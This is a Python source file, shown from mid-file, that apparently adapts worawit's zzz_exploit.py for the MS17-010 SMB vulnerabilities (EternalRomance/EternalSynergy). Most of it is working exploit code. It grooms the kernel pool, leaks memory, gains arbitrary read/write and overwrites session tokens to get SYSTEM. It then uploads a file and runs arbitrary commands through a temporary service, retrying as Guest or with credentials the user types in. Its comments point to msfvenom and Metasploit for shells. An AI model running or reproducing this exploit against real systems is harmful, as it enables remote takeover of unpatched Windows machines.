            'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN8_32_SESSION_INFO),
            'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN8_64_SESSION_INFO),
        },
        'WINXP': {
            'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WINXP_32_SESSION_INFO),
            'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
        },
        'WIN2K3': {
            'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K3_32_SESSION_INFO),
            'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
        },
        'WIN2K': {
            'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K_32_SESSION_INFO),
        },
    }

    TRANS_NAME_LEN = 4
    HEAP_HDR_SIZE = 8 


    def calc_alloc_size(size, align_size):
        return (size + align_size - 1) & ~(align_size - 1)


    def wait_for_request_processed(conn):
        conn.send_echo('a')


    def find_named_pipe(conn):
        pipes = ['browser', 'spoolss', 'netlogon', 'lsarpc', 'samr', 'InitShutdown', 'lsass', 'ntsvcs', 'scerpc', 'epmapper', 'atsvc', 'eventlog', 'spoolss', 'wkssvc', 'trkwks', 'srvsvc', 'protected_storage', 'plugplay', 'keysvc', 'MsFteWds', 'W32TIME_ALT' ]

        tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
        found_pipe = None
        for pipe in pipes:
            try:
                fid = conn.nt_create_andx(tid, pipe)
                conn.close(tid, fid)
                found_pipe = pipe
                break
            except smb.SessionError as e:
                pass

        conn.disconnect_tree(tid)
        return found_pipe


    def reset_extra_mid(conn):
        global extra_last_mid, special_mid
        special_mid = (conn.next_mid() & 0xff00) - 0x100
        extra_last_mid = special_mid


    def next_extra_mid():
        global extra_last_mid
        extra_last_mid += 1
        return extra_last_mid


    GROOM_TRANS_SIZE = 0x5010


    def leak_frag_size(conn, tid, fid):
        info = {}

        mid = conn.next_mid()
        req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data=b'A' * 0x10d0,
                                           maxParameterCount=GROOM_TRANS_SIZE - 0x10d0 - TRANS_NAME_LEN)
        req2 = conn.create_nt_trans_secondary_packet(mid, data=b'B' * 276)  
        conn.send_raw(req1[:-8])
        conn.send_raw(req1[-8:] + req2)
        leakData = conn.recv_transaction_data(mid, 0x10d0 + 276)
        leakData = leakData[0x10d4:]  
        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET'] + 4] == b'Frag':
            print('Target is 32 bit')
            info['arch'] = 'x86'
            info['FRAG_POOL_SIZE'] = leakData[X86_INFO['FRAG_TAG_OFFSET'] - 2] * X86_INFO['POOL_ALIGN']
        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET'] + 4] == b'Frag':
            print('Target is 64 bit')
            info['arch'] = 'x64'
            info['FRAG_POOL_SIZE'] = leakData[X64_INFO['FRAG_TAG_OFFSET'] - 2] * X64_INFO['POOL_ALIGN']
        else:
            print('Not found Frag pool tag in leak data')
            sys.exit()

        print('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))
        return info


    def read_data(conn, info, read_addr, read_size):
        fmt = info['PTR_FMT']
        new_data = pack('<' + fmt * 3, info['trans2_addr'] + info['TRANS_FLINK_OFFSET'], info['trans2_addr'] + 0x200,
                        read_addr)  
        new_data += pack('<II', 0, 0)  
        new_data += pack('<III', 8, 8, 8)  
        new_data += pack('<III', read_size, read_size, read_size)  
        new_data += pack('<HH', 0, 5) 
        conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])

        conn.send_nt_trans(5, param=pack('<HH', info['fid'], 0), totalDataCount=0x4300 - 0x20, totalParameterCount=0x1000)

        conn.send_nt_trans_secondary(mid=info['trans2_mid'])
        read_data = conn.recv_transaction_data(info['trans2_mid'], 8 + read_size)

        info['trans2_addr'] = unpack_from('<' + fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']

        conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('<' + fmt, info['trans2_addr']),
                                     paramDisplacement=info['TRANS_INDATA_OFFSET'])
        wait_for_request_processed(conn)

        conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']),
                                     dataDisplacement=info['TRANS_MID_OFFSET'])
        wait_for_request_processed(conn)

        return read_data[8:]  


    def write_data(conn, info, write_addr, write_data):
        conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<' + info['PTR_FMT'], write_addr),
                                     dataDisplacement=info['TRANS_INDATA_OFFSET'])
        wait_for_request_processed(conn)

        conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)
        wait_for_request_processed(conn)


    def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
        trans_param = pack('<HH', fid, 0)  
        for i in range(numFill):
            conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0, maxParameterCount=GROOM_TRANS_SIZE - 0x10d0)

        mid_ntrename = conn.next_mid()
        req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data='A' * 0x10d0,
                                           maxParameterCount=info['GROOM_DATA_SIZE'] - 0x10d0)
        req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='B' * 276)  
        req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE'] - 0x1000,
                                           maxParameterCount=0x1000)
        reqs = []
        for i in range(12):
            mid = next_extra_mid()
            reqs.append(
                conn.create_trans_packet('', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE'] - 0x200,
                                         totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))

        conn.send_raw(req1[:-8])
        conn.send_raw(req1[-8:] + req2 + req3 + b''.join(reqs)) # LINEA MODIFICADA


        leakData = conn.recv_transaction_data(mid_ntrename, 0x10d0 + 276)
        leakData = leakData[0x10d4:]  
        if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET'] + 4] != b'Frag':
            print('Not found Frag pool tag in leak data')
            return None


        leakData = leakData[info['FRAG_TAG_OFFSET'] - 4 + info['FRAG_POOL_SIZE']:]
        expected_size = pack('<H', info['BRIDE_TRANS_SIZE'])
        leakTransOffset = info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE']
        if leakData[0x4:0x8] != b'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN'] + 2] != expected_size or leakData[
                                                                                                                  leakTransOffset + 2:leakTransOffset + 4] != expected_size:
            print('No transaction struct in leak data')
            return None

        leakTrans = leakData[leakTransOffset:]

        ptrf = info['PTR_FMT']
        _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<' + ptrf * 5, leakTrans, 8)
        inparam_value = unpack_from('<' + ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
        leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]

        print('CONNECTION: 0x{:x}'.format(connection_addr))
        print('SESSION: 0x{:x}'.format(session_addr))
        print('FLINK: 0x{:x}'.format(flink_value))
        print('InParam: 0x{:x}'.format(inparam_value))
        print('MID: 0x{:x}'.format(leak_mid))

        next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
        if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info[
            'SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
            print('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))
            return None

        return {
            'connection': connection_addr,
            'session': session_addr,
            'next_page_addr': next_page_addr,
            'trans1_mid': leak_mid,
            'trans1_addr': inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN,
            'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET'],
        }


    def exploit_matched_pairs(conn, pipe_name, info):

        tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
        conn.set_default_tid(tid)
        fid = conn.nt_create_andx(tid, pipe_name)

        info.update(leak_frag_size(conn, tid, fid))
        info.update(OS_ARCH_INFO[info['os']][info['arch']])

        info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'],
                                                  info['POOL_ALIGN'])
        print('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
        info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE']  

        bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
        info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
        print('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
        info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']


        leakInfo = None
        for i in range(10):
            reset_extra_mid(conn)
            leakInfo = align_transaction_and_leak(conn, tid, fid, info)
            if leakInfo is not None:
                break
            print('leak failed... try again')
            conn.close(tid, fid)
            conn.disconnect_tree(tid)

            tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
            conn.set_default_tid(tid)
            fid = conn.nt_create_andx(tid, pipe_name)

        if leakInfo is None:
            return False

        info['fid'] = fid
        info.update(leakInfo)


        shift_indata_byte = 0x200
        conn.do_write_andx_raw_pipe(fid, b'A' * shift_indata_byte)


        indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info[
            'SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte
        indata_next_trans_displacement = info['trans2_addr'] - indata_value
        conn.send_nt_trans_secondary(mid=fid, data=b'\x00',
                                     dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
        wait_for_request_processed(conn)

        recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
        if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
            print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
            print('!!! Write to wrong place !!!')
            print('the target might be crashed')
            return False

        print('success controlling groom transaction')

        print('modify trans1 struct for arbitrary read/write')
        fmt = info['PTR_FMT']
        conn.send_nt_trans_secondary(mid=fid, data=pack('<' + fmt, info['trans1_addr']),
                                     dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
        wait_for_request_processed(conn)

        conn.send_nt_trans_secondary(mid=special_mid,
                                     data=pack('<' + fmt * 3, info['trans1_addr'], info['trans1_addr'] + 0x200,
                                               info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
        wait_for_request_processed(conn)

        info['trans2_mid'] = conn.next_mid()
        conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']),
                                     dataDisplacement=info['TRANS_MID_OFFSET'])
        return True


    def exploit_fish_barrel(conn, pipe_name, info):

        tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
        conn.set_default_tid(tid)
        fid = conn.nt_create_andx(tid, pipe_name)
        info['fid'] = fid

        if info['os'] == 'WIN7' and 'arch' not in info:
            info.update(leak_frag_size(conn, tid, fid))

        if 'arch' in info:
            info.update(OS_ARCH_INFO[info['os']][info['arch']])
            attempt_list = [OS_ARCH_INFO[info['os']][info['arch']]]
        else:
            attempt_list = [OS_ARCH_INFO[info['os']]['x64'], OS_ARCH_INFO[info['os']]['x86']]


        print('Groom packets')
        trans_param = pack('<HH', info['fid'], 0)
        for i in range(12):
            mid = info['fid'] if i == 8 else next_extra_mid()
            conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100 - TRANS_NAME_LEN,
                            totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0)

        shift_indata_byte = 0x200
        conn.do_write_andx_raw_pipe(info['fid'], 'A' * shift_indata_byte)

        success = False
        for tinfo in attempt_list:
            print('attempt controlling next transaction on ' + tinfo['ARCH'])
            HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE'] + HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % \
                                  tinfo['POOL_ALIGN']
            NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE

            conn.send_trans_secondary(mid=info['fid'], data='\x00',
                                      dataDisplacement=NEXT_TRANS_OFFSET + tinfo['TRANS_MID_OFFSET'])
            wait_for_request_processed(conn)

            recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
            if recvPkt.getNTStatus() == 0x10002:  
                print('success controlling one transaction')
                success = True
                if 'arch' not in info:
                    print('Target is ' + tinfo['ARCH'])
                    info['arch'] = tinfo['ARCH']
                    info.update(OS_ARCH_INFO[info['os']][info['arch']])
                break
            if recvPkt.getNTStatus() != 0:
                print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))

        if not success:
            print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
            print('!!! Write to wrong place !!!')
            print('the target might be crashed')
            return False


        print('modify parameter count to 0xffffffff to be able to write backward')
        conn.send_trans_secondary(mid=info['fid'], data=b'\xff' * 4,
                                  dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_TOTALPARAMCNT_OFFSET'])
        if info['arch'] == 'x64':
            conn.send_trans_secondary(mid=info['fid'], data=b'\xff' * 4,
                                      dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'] + 4)
        wait_for_request_processed(conn)

        TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + info['TRANS_SIZE'] + 0x1000 + HEAP_CHUNK_PAD_SIZE
        PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + info['TRANS_SIZE'] + TRANS_NAME_LEN
        PREV_TRANS_OFFSET = 0x100000000 - PREV_TRANS_DISPLACEMENT

        conn.send_nt_trans_secondary(mid=special_mid, param=b'\xff' * 4,
                                     paramDisplacement=PREV_TRANS_OFFSET + info['TRANS_TOTALPARAMCNT_OFFSET'])
        if info['arch'] == 'x64':
            conn.send_nt_trans_secondary(mid=special_mid, param=b'\xff' * 4,
                                         paramDisplacement=PREV_TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'] + 4)
            conn.send_trans_secondary(mid=info['fid'], data=b'\x00' * 4,
                                      dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'] + 4)
        wait_for_request_processed(conn)


        print('leak next transaction')
        conn.send_trans_secondary(mid=info['fid'], data=b'\x05',
                                  dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_FUNCTION_OFFSET'])
        conn.send_trans_secondary(mid=info['fid'], data=pack('<IIIII', 4, 4, 4, 0x100, 0x100),
                                  dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_PARAMCNT_OFFSET'])

        conn.send_nt_trans_secondary(mid=special_mid)
        leakData = conn.recv_transaction_data(special_mid, 0x100)
        leakData = leakData[4:]  

        if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
            print('chunk size is wrong')
            return False

        leakTranOffset = HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
        leakTrans = leakData[leakTranOffset:]
        fmt = info['PTR_FMT']
        _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<' + fmt * 5, leakTrans, 8)
        inparam_value, outparam_value, indata_value = unpack_from('<' + fmt * 3, leakTrans, info['TRANS_INPARAM_OFFSET'])
        trans2_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]

        print('CONNECTION: 0x{:x}'.format(connection_addr))
        print('SESSION: 0x{:x}'.format(session_addr))
        print('FLINK: 0x{:x}'.format(flink_value))
        print('InData: 0x{:x}'.format(indata_value))
        print('MID: 0x{:x}'.format(trans2_mid))

        trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
        trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
        print('TRANS1: 0x{:x}'.format(trans1_addr))
        print('TRANS2: 0x{:x}'.format(trans2_addr))


        print('modify transaction struct for arbitrary read/write')

        TRANS_OFFSET = 0x100000000 - (info['TRANS_SIZE'] + TRANS_NAME_LEN)
        conn.send_nt_trans_secondary(mid=info['fid'],
                                     param=pack('<' + fmt * 3, trans1_addr, trans1_addr + 0x200, trans2_addr),
                                     paramDisplacement=TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'])
        wait_for_request_processed(conn)

        trans1_mid = conn.next_mid()
        conn.send_trans_secondary(mid=info['fid'], param=pack('<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
        wait_for_request_processed(conn)

        info.update({
            'connection': connection_addr,
            'session': session_addr,
            'trans1_mid': trans1_mid,
            'trans1_addr': trans1_addr,
            'trans2_mid': trans2_mid,
            'trans2_addr': trans2_addr,
        })
        return True


    def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):
        SID_SYSTEM = pack('<BB5xB' + 'I', 1, 1, 5, 18)
        SID_ADMINISTRATORS = pack('<BB5xB' + 'II', 1, 2, 5, 32, 544)
        SID_AUTHENICATED_USERS = pack('<BB5xB' + 'I', 1, 1, 5, 11)
        SID_EVERYONE = pack('<BB5xB' + 'I', 1, 1, 1, 0)
        sids = [SID_SYSTEM, SID_ADMINISTRATORS, SID_EVERYONE, SID_AUTHENICATED_USERS]

        attrs = [0, 0xe, 7, 7]

        fakeUserAndGroupCount = min(userAndGroupCount, 4)
        fakeUserAndGroupsAddr = userAndGroupsAddr

        addr = fakeUserAndGroupsAddr + (fakeUserAndGroupCount * info['PTR_SIZE'] * 2)
        fakeUserAndGroups = b''
        for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):
            fakeUserAndGroups += pack(b'<' + info['PTR_FMT'].encode() * 2, addr, attr)
            addr += len(sid)
        fakeUserAndGroups += b''.join(sids[:fakeUserAndGroupCount])

        return fakeUserAndGroupCount, fakeUserAndGroups


    def exploit(target, port, pipe_name):
        conn = MYSMB(target, port)

        conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        info = {}

        conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
        server_os = conn.get_server_os()
        print('Target OS: ' + server_os)
        if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
            info['os'] = 'WIN7'
            info['method'] = exploit_matched_pairs
        elif server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ") or server_os.startswith(
                "Windows Server 2016 ") or server_os.startswith("Windows 10") or server_os.startswith("Windows RT 9200"):
            info['os'] = 'WIN8'
            info['method'] = exploit_matched_pairs
        elif server_os.startswith("Windows Server (R) 2008") or server_os.startswith('Windows Vista'):
            info['os'] = 'WIN7'
            info['method'] = exploit_fish_barrel
        elif server_os.startswith("Windows Server 2003 "):
            info['os'] = 'WIN2K3'
            info['method'] = exploit_fish_barrel
        elif server_os.startswith("Windows 5.1"):
            info['os'] = 'WINXP'
            info['arch'] = 'x86'
            info['method'] = exploit_fish_barrel
        elif server_os.startswith("Windows XP "):
            info['os'] = 'WINXP'
            info['arch'] = 'x64'
            info['method'] = exploit_fish_barrel
        elif server_os.startswith("Windows 5.0"):
            info['os'] = 'WIN2K'
            info['arch'] = 'x86'
            info['method'] = exploit_fish_barrel
        else:
            print('This exploit does not support this target')
            sys.exit()

        if pipe_name is None:
            pipe_name = find_named_pipe(conn)
            if pipe_name is None:
                print('\n[!] Not found accessible named pipe')
                return False
            print('Using named pipe: ' + pipe_name)

        if not info['method'](conn, pipe_name, info):
            return False


        fmt = info['PTR_FMT']

        print('make this SMB session to be SYSTEM')
        write_data(conn, info, info['session'] + info['SESSION_ISNULL_OFFSET'], b'\x00\x01')

        sessionData = read_data(conn, info, info['session'], 0x100)  # Verificar que retorna bytes
        secCtxAddr = unpack_from('<' + fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]

        if 'PCTXTHANDLE_TOKEN_OFFSET' in info:

            if 'SECCTX_PCTXTHANDLE_OFFSET' in info:
                pctxtDataInfo = read_data(conn, info, secCtxAddr + info['SECCTX_PCTXTHANDLE_OFFSET'], 8)  # Verificar bytes
                pctxtDataAddr = unpack_from('<' + fmt, pctxtDataInfo)[0]
            else:
                pctxtDataAddr = secCtxAddr

            tokenAddrInfo = read_data(conn, info, pctxtDataAddr + info['PCTXTHANDLE_TOKEN_OFFSET'], 8)  # Verificar bytes
            tokenAddr = unpack_from('<' + fmt, tokenAddrInfo)[0]
            print('current TOKEN addr: 0x{:x}'.format(tokenAddr))

            tokenData = read_data(conn, info, tokenAddr, 0x40 * info['PTR_SIZE'])

            userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset = get_group_data_from_token(
                info, tokenData)

            print('overwriting token UserAndGroups')
            fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount,
                                                                                        userAndGroupsAddr)
            if fakeUserAndGroupCount != userAndGroupCount:
                write_data(conn, info, tokenAddr + userAndGroupCountOffset, pack('<I', fakeUserAndGroupCount))
            write_data(conn, info, userAndGroupsAddr, fakeUserAndGroups)


        else:
            secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])

            print('overwriting session security context')
            write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])


        #try:
        smb_pwn(conn, info['arch'])
        #except:
            #pass
            
        if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
            userAndGroupsOffset = userAndGroupsAddr - tokenAddr
            write_data(conn, info, userAndGroupsAddr,
                       tokenData[userAndGroupsOffset:userAndGroupsOffset + len(fakeUserAndGroups)])
            if fakeUserAndGroupCount != userAndGroupCount:
                write_data(conn, info, tokenAddr + userAndGroupCountOffset, pack('<I', userAndGroupCount))
        else:
            write_data(conn, info, secCtxAddr, secCtxData)

        conn.disconnect_tree(conn.get_tid())
        conn.logoff()
        conn.get_socket().close()
        return True


    def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset):

        userAndGroupCount, RestrictedSidCount = unpack_from('<II', tokenData, userAndGroupCountOffset)
        userAndGroupsAddr, RestrictedSids = unpack_from('<' + info['PTR_FMT'] * 2, tokenData, userAndGroupsAddrOffset)

        success = True

        if RestrictedSidCount != 0 or RestrictedSids != 0 or userAndGroupCount == 0 or userAndGroupsAddr == 0:
            print('Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')
            print('RestrictedSids: 0x{:x}'.format(RestrictedSids))
            print('RestrictedSidCount: 0x{:x}'.format(RestrictedSidCount))
            success = False

        print('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))
        print('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))

        return success, userAndGroupCount, userAndGroupsAddr


    def get_group_data_from_token(info, tokenData):
        userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET']
        userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET']

        success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset,
                                                                              userAndGroupsAddrOffset)

        if not success and info['os'] == 'WINXP' and info['arch'] == 'x86':
            print('Attempting WINXP SP0/SP1 x86 TOKEN_USER_GROUP workaround')

            userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1']
            userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1']

            success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset,
                                                                                  userAndGroupsAddrOffset)


        if not success:
            print('Bad TOKEN_USER_GROUP offsets. Abort > BSOD')
            sys.exit()

        return userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset


    def smb_pwn(conn, arch):

        smbConn = conn.get_smbconnection()
        if transfer_bolean==True:
            smb_send_file(smbConn, route_file_input, 'C', route_file_output) #Se confirma que el archivo llega sin daños
        time.sleep(1)
        if command_bolean==True:
            service_exec(conn, r'cmd /c '+command)

        #print('creating file c:\\pwned.txt on the target')
        #tid2 = smbConn.connectTree('C$')
        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
        #smbConn.closeFile(tid2, fid2)
        #smbConn.disconnectTree(tid2)



    # service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."

    def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
        with open(localSrc, 'rb') as fp:
            smbConn.putFile(remoteDrive + '$', remotePath, fp.read)


    # based on impacket/examples/serviceinstall.py
    # Note: using Windows Service to execute command same as how psexec works
    def service_exec(conn, cmd): # POR ARREGLAR!!

        import random
        import string
        from impacket.dcerpc.v5 import transport, srvs, scmr

        service_name = ''.join([random.choice(string.ascii_letters) for i in range(4)])  
        rpcsvc = conn.get_dce_rpc('svcctl')
        rpcsvc.connect()
        rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
        svcHandle = None
        try:
            print("Opening SVCManager on %s....." % conn.get_remote_host())
            resp = scmr.hROpenSCManagerW(rpcsvc)
            svcHandle = resp['lpScHandle']
            try:
                resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name + '\x00')
            except Exception as e:
                if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') == -1:
                    raise e 
            else:
                scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
                scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
            print('Creating service %s.....' % service_name)
            resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00',
                                         lpBinaryPathName=cmd + '\x00')
            serviceHandle = resp['lpServiceHandle']

            if serviceHandle:
                try:
                    print('Starting service %s.....' % service_name)
                    scmr.hRStartServiceW(rpcsvc, serviceHandle)
                except Exception as e:
                    print(str(e))
                print("\n[+] Your command should be already executed on the target machine.\n")
                worked = True
                print('Removing service %s.....' % service_name)
                scmr.hRDeleteService(rpcsvc, serviceHandle)
                scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)

        except Exception as e:
            print("ServiceExec Error on: %s" % conn.get_remote_host())
            print(str(e))
        finally:
            if svcHandle:
                scmr.hRCloseServiceHandle(rpcsvc, svcHandle)

        rpcsvc.disconnect()


    target = ip_address
    pipe_name = None
    port = 445
    worked = False
    exploit(target, port, pipe_name)
    print('\n[!] Exploit failed. Trying with the username \'Guest\', just in case...\n')
    time.sleep(1)
    try:
        USERNAME='Guest'
        exploit(target, port, pipe_name)
    except:
        if pipe_name == None:
            print("[!] Pipes still not accessible...\n")
            print("[!] Exploit can not succed because pipes are unaccessible. But you still have anohter option, If you know any valid credentials on the target machine, you can use those to get accessible pipes to execute the exploit and get nt_authority/system.\n\nIntroduce any credentias you could have from target machine:")
            try:
                USERNAME=input("Type username :")
                PASSWORD=input("Type password :")
                exploit(target, port, pipe_name)
            except:
                if pipe_name is None and not worked:
                    print('\n[!] coulden We\'t find any pipe open. Because this exploit is based on eternal Romance \\ eternal synergy exploits will not crash the target but it needs an open pipe to work.\n')
                    print('\nNOTE: IF no pipe is found you can still try with the original EternalBlue exploit, I sudgest you to use "exploit/windows/smb/ms17_010_eternalblue" from metasploit, which is the most reliable version of that exploit. Remember that version could crash the target, so go carefull.\n')




def banner():
    ascii_art = """                                                                      

                                 .-:                                  
                               -*%%%#+.                               
                             =#%%%%%%%%+.                             
                           .*%%%%%%%%%%%#-                            
                          :#%%%%%%%%%%%%%#=                           
                         :#*%%%#=:..=*%%%*#=                          
                         ##%%+:       .=#@#%:                         
                        =%%*.           .=%%#                         
                        #%=               :#%:                        
                       .@= .              .:%=                        
                        #.:-             :- *:                        
                       ...:%=           :%+ :.   -                    
                      :%+. +%+         -%#: -#: *:                    
                    ..::--:..=+:     .++:.:+=.:#= =                   
                   .-=+++++=-::::   .:.  .. .+#- =-                   
                  -+=-:...::-=+++=:.     .-*#+  *+ :                  
                    :-=++++=-:.  ... .:=#%*-  -#- -.                  
                 .=+=-:..........:=+###+-  .=#+. =:.                  
                 :.  .:::.  .-+#%#*=:   .-*#+. -*:.:                  
                   :-:.  .-#%#+-.   .-+#*+:  -*= :-                   
                 .:.   .+%#+:    :=+*+-.  :=+=. --                    
                      =%#-    :=++-:   .-+=:  :-.                     
                     +%-   .-==-.   .-==:   :-:                       
                    =*.   :=-.   .:--:   .:-:                         
                   :+    --.   .:-:    .::.                           
                   :    ::    .:.    .:.                              
                       :.    :.    ...                                
                      ..    :.    ..                                  
                                                                      """
    description = "Python3 (partially) adaptation of the original zzz_exploit.py from worawit (https://github.com/worawit/MS17-010).\nThis exploit is tested on windows 7 and windows server 2003. Because zzz_exploit, and therefore this exploit, are based on\neternal romance / eternal sinergy exploits, you will need accessible named pipes to get it work.\n"                                                         

    print(ascii_art)
    print(description)


def main():

